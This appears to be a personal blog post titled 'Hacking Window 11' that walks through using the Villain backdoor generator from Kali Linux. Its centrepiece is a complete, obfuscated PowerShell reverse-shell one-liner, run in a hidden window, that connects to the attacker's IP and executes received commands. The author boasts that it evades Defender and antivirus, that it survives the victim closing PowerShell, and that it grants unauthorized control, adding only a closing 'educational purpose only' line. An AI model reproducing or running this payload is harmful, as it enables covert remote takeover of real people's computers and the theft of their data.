---
title: Hacking Window 11
author: Radeel Ahmad
pubDatetime: 2022-07-05T02:05:51Z
featured: false
draft: false
tags:
  - hacking
  - window hacking
  - window 11
description: "Hacking Window 11 Using PowerShell Script"
---

## Requirements
- Kali Linux Machine (attacking machine)
- Windows 11 (victim machine)
- Villain (In Kali Machine)

## Let’s Start…..
Open Kali machine and open Firefox, then download the [**Villain**](https://github.com/t3l3machus/Villain).

<img src="https://raw.githubusercontent.com/RadeelAhmad/my-portfolio/main/src/content/blog/Images/1.png" alt="Wifi hacking">

Now, open Villain after downloading.

<img src="https://raw.githubusercontent.com/RadeelAhmad/my-portfolio/main/src/content/blog/Images/2.png" alt="Wifi hacking">

Install the requirement for the tool using the following command.
```bash
pip3 install -r requirements.txt
```
After the installation, we start the villain.


command: **python3 Villain.py**

## Important

The villain is a Windows and Linux backdoor generator and multi-session handler that allows users to connect with sibling servers (other machines running Villain) and share their backdoor sessions, which is handy for working as a team.

Villain has a built-in auto-obfuscate payload function to assist users bypassing AV solutions (for Windows payloads). As a result, payloads are undetected (for the time being).

## Victim side

We run the script in the Powers Shell of the victim’s system (Window 11 Pro)

```bash
Start-Process $PSHOME\powershell.exe -ArgumentList {$client = N''e""w-O'b'je"c"t System.Net.Sockets.TCPClient('YOUR IP',4443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (N''e'w'-O''b""je'c't -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (i''e""x $data 2>&1 | O""u''t-S''t""ring );$sendback2 = $sendback + 'PS ' + (p""w''d).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()} -WindowStyle Hidden
```


In this script enter the IP of your kali machine by using `ifconfig` command you see the IP of kali machine.

Fully updated. Windows 11. Everything is turned on for Defender protection and the firewall. Please check the screenshots below for confirmation.



## In Kali Linux

After you enter the script, press Enter, and BOOM 🤯! Just kidding, nothing significant will happen on the victim’s machine. However, you will observe a session opening on your terminal.


Here we can see `Session ID` — `IP Address` — `OS Type` — `User` — `Status`.

Using the `shell + session ID` command allows you to gain control over the victim’s computer andexecute various commands.


We use `systeminfo` command to see the detail of victim’s machine.


WE SUCCESSFULLY EXPLOIT VULNERABILITIES WITHIN THE WINDOWS 11 PRO OPERATING SYSTEM TO GAIN UNAUTHORIZED ACCESS 😈.

## Essential Things You Must Know ⚠

- If the victim closes the PowerShell, it won’t stop the reverse shell.
- The PowerShell command remains hidden and isn’t detected by Defender and other advanced antivirus programs.

---

Thank You for reading this article. I hope that you have found this information provided to be valuable and helpful. Use it for educational purpose only…. 🙂
